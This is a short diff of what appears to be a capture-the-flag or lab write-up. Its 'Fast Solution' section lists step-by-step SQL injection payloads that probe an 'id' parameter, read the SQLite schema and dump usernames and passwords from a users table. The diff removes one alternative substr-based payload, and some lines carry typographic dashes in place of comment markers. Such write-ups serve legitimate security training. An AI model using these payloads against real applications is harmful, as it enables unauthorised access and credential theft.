@@ -15,10 +15,9 @@ Retrieve the administrator password.
 
 ## Fast Solution
 
+
 * id=3'
 * id=3 order by 5 -- -
 * id=3 union select 1,2,3 from sqlite_master -- -
 * id=3 union select 1,sql,name from sqlite_master — –
 * id=3 union select 1,username,password from users– –
-Or
-* id=3 union select 1,2,substr(username || password,20,-20) from users– –
